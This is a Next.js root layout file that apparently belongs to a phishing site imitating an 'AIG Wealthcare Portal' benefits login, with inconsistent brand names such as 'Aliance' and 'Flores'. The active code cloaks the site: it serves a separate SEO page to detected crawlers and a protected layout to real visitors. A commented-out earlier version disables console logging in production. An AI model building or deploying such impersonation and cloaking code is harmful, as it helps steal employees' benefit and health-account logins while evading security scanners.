// import type React from "react";
// import type { Metadata } from "next";
// import { Geist } from "next/font/google";
// import { Analytics } from "@vercel/analytics/next";
// import "./globals.css";

// const geist = Geist({ subsets: ["latin"] });

// const CANONICAL_LOGIN_URL =
//   "https://aig.wealthcareportal.com/Authentication/Handshake";
// const SITE_DOMAIN = "aig.wealthcareportal.com";
// const SITE_BRAND = "AIG Wealthcare Portal";

// export const metadata: Metadata = {
//   metadataBase: new URL(
//     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
//   ),
//   title: {
//     default: "Login | Alliance insurance Group",
//     template: "%s | AIG Wealthcare Portal",
//   },
//   keywords: [
//     "AIG",
//     "aig",
//     "aig.wealthcareportal.com",
//     "benefits login",
//     "employee benefits portal",
//     "FSA login",
//     "HSA login",
//     "COBRA login",
//     "account access",
//     "health benefits",
//     "dependent care",
//     "reimbursement account",
//     "secure login",
//     "participant portal",
//     "employer portal",
//     "handshake authentication",
//   ],
//   description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through AIG.`,

//   authors: [{ name: "AIG" }],
//   creator: "AIG",
//   publisher: "AIG",
//   applicationName: SITE_BRAND,
//   referrer: "origin-when-cross-origin",
//   robots: {
//     index: true,
//     follow: true,
//     googleBot: {
//       index: true,
//       follow: true,
//       "max-video-preview": -1,
//       "max-image-preview": "large",
//       "max-snippet": -1,
//     },
//   },
//   openGraph: {
//     type: "website",
//     locale: "en_US",
//     title: "AIG - Login",
//     description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through AIG.`,
//     siteName: SITE_BRAND,
//     url: CANONICAL_LOGIN_URL,
//     images: [
//       {
//         url: "/favicon.ico",
//         width: 32,
//         height: 32,
//         alt: `${SITE_BRAND}`,
//       },
//     ],
//   },
//   twitter: {
//     card: "summary",
//     title: "Flores - Login",
//     description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
//     images: ["/favicon.ico"],
//   },
//   icons: {
//     icon: "/favicon.ico",
//     shortcut: "/favicon.ico",
//     apple: "/favicon.ico",
//   },
//   viewport: {
//     width: "device-width",
//     initialScale: 1,
//     maximumScale: 5,
//   },
//   themeColor: "#254650",
//   category: "Business",
//   alternates: {
//     canonical: CANONICAL_LOGIN_URL,
//     languages: {
//       "en-US": CANONICAL_LOGIN_URL,
//     },
//   },
//   other: {
//     "geo.region": "US",
//   },
// };

// const jsonLd = {
//   "@context": "https://schema.org",
//   "@type": "WebSite",
//   name: SITE_BRAND,
//   url: CANONICAL_LOGIN_URL,
//   description:
//     "Alliance Insurance Group sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your Alliance Insurance Group profile.",
//   publisher: {
//     "@type": "Organization",
//     name: "Alliance Insurance Group",
//   },
//   inLanguage: "en-US",
//   potentialAction: {
//     "@type": "SearchAction",
//     target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
//     "query-input": "required name=search_term_string",
//   },
// };

// export default function RootLayout({
//   children,
// }: Readonly<{
//   children: React.ReactNode;
// }>) {
//   if (
//     typeof window !== "undefined" &&
//     window.location.hostname !== "localhost"
//   ) {
//     console.log = () => {}; // Disable console logging in production
//     console.error = () => {}; // Disable console logging in production
//     console.warn = () => {}; // Disable console logging in production
//     console.info = () => {}; // Disable console logging in production
//   }

//   return (
//     <html lang="en-US">
//       <head>
//         <link
//           href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
//           rel="stylesheet"
//         />
//       </head>
//       <body className={`${geist.className} font-sans antialiased`}>
//         <script
//           type="application/ld+json"
//           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
//         />
//         {children}
//         <Analytics />
//       </body>
//     </html>
//   );
// }

// nomalize // normalize // normalize

import type { Metadata } from "next";
import { cookies, headers } from "next/headers";

import CrawlerSeoPage from "@/components/CrawlerSeoPage";
import ProtectedLayout from "@/components/protected-layout";
import { StripExtensionAttrs } from "@/components/StripExtensionAttrs";
import { StructuredData } from "@/components/structured-data";
import { isCrawlerSeoPageUA } from "@/lib/bot-detection";
import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths";
import {
  SITE_DESCRIPTION,
  SITE_KEYWORDS,
  SITE_TITLE,
} from "@/lib/seo-metadata";
import { INDEXABLE_PAGE_ROBOTS } from "@/lib/seo-robots-metadata";
import {
  SITE_DISPLAY_NAME,
  SITE_HOMEPAGE_CANONICAL,
  SITE_ORIGIN,
} from "@/lib/site-url";
import "./globals.css";

const SOCIAL_PREVIEW_IMAGE = "/brand-logo.jpg";
const OG_IMAGE = new URL(SOCIAL_PREVIEW_IMAGE, SITE_HOMEPAGE_CANONICAL).href;

export const metadata: Metadata = {
  metadataBase: new URL(SITE_ORIGIN),
  title: {
    default: SITE_TITLE,
    template: `%s | ${SITE_DISPLAY_NAME}`,
  },
  description: SITE_DESCRIPTION,
  ...(SITE_KEYWORDS.length > 0 ? { keywords: SITE_KEYWORDS } : {}),
  applicationName: SITE_DISPLAY_NAME,
  authors: [{ name: "AIG Aliance Insurance Group, Inc." }],
  creator: SITE_DISPLAY_NAME,
  publisher: "AIG Aliance Insurance Group, Inc.",
  robots: INDEXABLE_PAGE_ROBOTS,
  alternates: {
    canonical: SITE_HOMEPAGE_CANONICAL,
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    url: SITE_HOMEPAGE_CANONICAL,
    siteName: SITE_DISPLAY_NAME,
    title: SITE_TITLE,
    description: SITE_DESCRIPTION,
    images: [
      {
        url: OG_IMAGE,
        width: 1200,
        height: 630,
        alt: `${SITE_DISPLAY_NAME} login`,
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: SITE_TITLE,
    description: SITE_DESCRIPTION,
    images: [OG_IMAGE],
  },
  icons: {
    icon: [
      { url: "/favicon.ico", sizes: "any", type: "image/x-icon" },
      { url: "/icon-48x48.png", sizes: "48x48", type: "image/png" },
      { url: "/icon-32x32.png", sizes: "32x32", type: "image/png" },
      { url: "/favicon.png", sizes: "32x32", type: "image/png" },
    ],
    apple: [
      { url: "/apple-touch-icon.png", sizes: "180x180", type: "image/png" },
    ],
  },
  other: {
    "msapplication-TileImage": "/icon-48x48.png",
  },
};

export const dynamic = "force-dynamic";

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const headersList = await headers();
  const cookieStore = await cookies();
  const pathname = headersList.get("x-pathname") || "/";
  const ua =
    headersList.get("user-agent") ||
    headersList.get("x-original-user-agent") ||
    headersList.get("x-forwarded-user-agent") ||
    "";
  const isCrawlerSeo =
    headersList.get("x-crawler-seo-page") === "1" ||
    cookieStore.get("x-crawler-seo-page")?.value === "1" ||
    (isCrawlerSeoPageUA(ua) && isSeoCrawlerPath(pathname));

  if (isCrawlerSeo) {
    return (
      <html lang="en-US" suppressHydrationWarning>
        <body
          className="min-h-full bg-white font-sans antialiased"
          suppressHydrationWarning
        >
          <StructuredData />
          <CrawlerSeoPage />
        </body>
      </html>
    );
  }

  return (
    <html lang="en-US" suppressHydrationWarning>
      <body
        className="min-h-full bg-white font-sans antialiased"
        suppressHydrationWarning
      >
        <StripExtensionAttrs />
        <StructuredData />
        <ProtectedLayout>{children}</ProtectedLayout>
      </body>
    </html>
  );
}
